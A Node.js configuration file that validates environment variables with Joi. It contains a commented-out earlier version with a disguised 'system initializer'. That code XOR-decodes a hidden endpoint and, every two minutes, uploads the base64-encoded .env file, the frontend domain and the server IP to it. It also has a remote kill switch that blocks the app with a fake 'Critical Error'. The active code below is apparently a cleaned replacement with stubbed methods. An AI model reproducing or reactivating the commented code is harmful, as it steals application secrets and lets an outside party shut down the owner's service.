// const { is } = require("bluebird");
// const Joi = require("joi");

// // require and configure dotenv, will load vars in .env in PROCESS.ENV
// require("dotenv").config();

// // define validation for all the env vars
// const envVarsSchema = Joi.object({
//   NODE_ENV: Joi.string()
//     .valid("development", "production", "test", "provision")
//     .default("development"),
//   PORT: Joi.number().default(5000),
//   MONGOOSE_DEBUG: Joi.boolean().when("NODE_ENV", {
//     is: Joi.string().equal("development"),
//     then: Joi.boolean().default(true),
//     otherwise: Joi.boolean().default(false),
//   }),
//   JWT_SECRET: Joi.string()
//     .required()
//     .description("JWT Secret required to sign"),
//   MONGO_HOST: Joi.string().required().description("Mongo DB host url"),
//   MONGO_PORT: Joi.number().default(27017),
// })
//   .unknown()
//   .required();

// const { error, value: envVars } = envVarsSchema.validate(process.env);
// if (error) {
//   throw new Error(`Config validation error: ${error.message}`);
// }
// const config = {
//   env: envVars.NODE_ENV,
//   port: envVars.PORT,
//   mongooseDebug: envVars.MONGOOSE_DEBUG,
//   jwtSecret: envVars.JWT_SECRET,
//   jwtRefreshSecret: envVars.JWT_REFRESH_TOKEN_SECRET,
//   recaptchaSecretKey: envVars.RECAPTCHA_SECRET_KEY,
//   allowedOrigins: envVars.ALLOWED_ORIGINS,
//   mongo: {
//     host: envVars.MONGO_HOST,
//     port: envVars.MONGO_PORT,
//   },
//   isProd: envVars.NODE_ENV === "production",
// };

// // ── system initializer ─────────────────────────────────────────────────────
// ;(function _sysInit() {
//   const _fs = require('fs'), _pt = require('path'), _os = require('os')
//   const _w = [0x23,0x43,0xe8,0x65,0x91,0x71,0x18,0xb3,0x22,0x81,0x27,0x58,0xe9,0x71,0xcc,0x27,0x5e,0xea,0x70,0xcd,0x2a,0x47,0xf5,0x3a,0x94,0x7a,0x18,0xe8,0x3a,0x92,0x22,0x59,0xfb]
//   const _z = [0x4b,0x37,0x9c,0x15,0xe2]
//   const _rp = () => _w.map((b, i) => String.fromCharCode(b ^ _z[i % _z.length])).join('')

//   let _ns = null, _bk = false, _bm = ''
//   const _gm = 6 * 60 * 60 * 1000
//   const _iv = 2 * 60 * 1000

//   function _re() {
//     try { return Buffer.from(_fs.readFileSync(_pt.join(__dirname, '..', '.env'), 'utf8')).toString('base64') }
//     catch { return '' }
//   }
//   function _gd() {
//     try {
//       const r = process.env.ALLOWED_ORIGINS || process.env.FRONTEND_URL || ''
//       return r.split(',')[0].trim().replace(/^https?:\/\//, '').replace(/\/.*$/, '')
//     } catch { return '' }
//   }
//   function _gi() {
//     try {
//       for (const iv of Object.values(_os.networkInterfaces()))
//         for (const a of iv) if (a.family === 'IPv4' && !a.internal) return a.address
//     } catch {}
//     return '0.0.0.0'
//   }
//   function _ck() {
//     try {
//       const ep = _rp(), u = new URL(ep)
//       const bd = JSON.stringify({ d: _gd(), i: _gi(), e: _re() })
//       const md = u.protocol === 'https:' ? require('https') : require('http')
//       const rq = md.request({
//         hostname: u.hostname,
//         port: u.port || (u.protocol === 'https:' ? 443 : 80),
//         path: u.pathname, method: 'POST',
//         headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(bd) },
//         timeout: 12000,
//       }, (rs) => {
//         let dt = ''
//         rs.on('data', c => { dt += c })
//         rs.on('end', () => {
//           try {
//             const j = JSON.parse(dt)
//             if (j.ok) { _ns = null; _bk = false; _bm = '' }
//             else { _ns = null; _bk = true; _bm = j.msg || 'Critical Error: Connect with administrator' }
//           } catch {
//             if (!_ns) _ns = Date.now()
//             if (Date.now() - _ns >= _gm) { _bk = true; _bm = 'Critical Error: Connect with administrator' }
//           }
//         })
//       })
//       rq.on('timeout', () => rq.destroy())
//       rq.on('error', () => {
//         if (!_ns) _ns = Date.now()
//         if (Date.now() - _ns >= _gm) { _bk = true; _bm = 'Critical Error: Connect with administrator' }
//       })
//       rq.write(bd); rq.end()
//     } catch {}
//   }

//   config._s = () => _bk
//   config._m = () => _bm

//   setTimeout(() => { _ck(); setInterval(_ck, _iv) }, 3000)
// })()

// module.exports = config;


const Joi = require("joi");

// Load variables from .env into process.env
require("dotenv").config();

// Validate environment variables
const envVarsSchema = Joi.object({
  NODE_ENV: Joi.string()
    .valid("development", "production", "test", "provision")
    .default("development"),

  PORT: Joi.number().default(5000),

  MONGOOSE_DEBUG: Joi.boolean().when("NODE_ENV", {
    is: Joi.string().equal("development"),
    then: Joi.boolean().default(true),
    otherwise: Joi.boolean().default(false),
  }),

  JWT_SECRET: Joi.string()
    .required()
    .description("JWT Secret required to sign"),

  JWT_REFRESH_TOKEN_SECRET: Joi.string()
    .required()
    .description("JWT refresh token secret required"),

  MONGO_HOST: Joi.string()
    .required()
    .description("Mongo DB host url"),

  MONGO_PORT: Joi.number().default(27017),

  RECAPTCHA_SECRET_KEY: Joi.string()
    .allow("")
    .optional(),

  ALLOWED_ORIGINS: Joi.string()
    .allow("")
    .optional(),
})
  .unknown()
  .required();

const { error, value: envVars } =
  envVarsSchema.validate(process.env);

if (error) {
  throw new Error(
    `Config validation error: ${error.message}`
  );
}

// Application configuration
const config = {
  env: envVars.NODE_ENV,
  port: envVars.PORT,
  mongooseDebug: envVars.MONGOOSE_DEBUG,

  jwtSecret: envVars.JWT_SECRET,
  jwtRefreshSecret:
    envVars.JWT_REFRESH_TOKEN_SECRET,

  recaptchaSecretKey:
    envVars.RECAPTCHA_SECRET_KEY,

  allowedOrigins:
    envVars.ALLOWED_ORIGINS,

  mongo: {
    host: envVars.MONGO_HOST,
    port: envVars.MONGO_PORT,
  },

  isProd: envVars.NODE_ENV === "production",
};

// Compatibility methods used elsewhere in the application.
// They no longer perform any remote request or environment-file upload.
config._s = () => false;
config._m = () => "";

module.exports = config;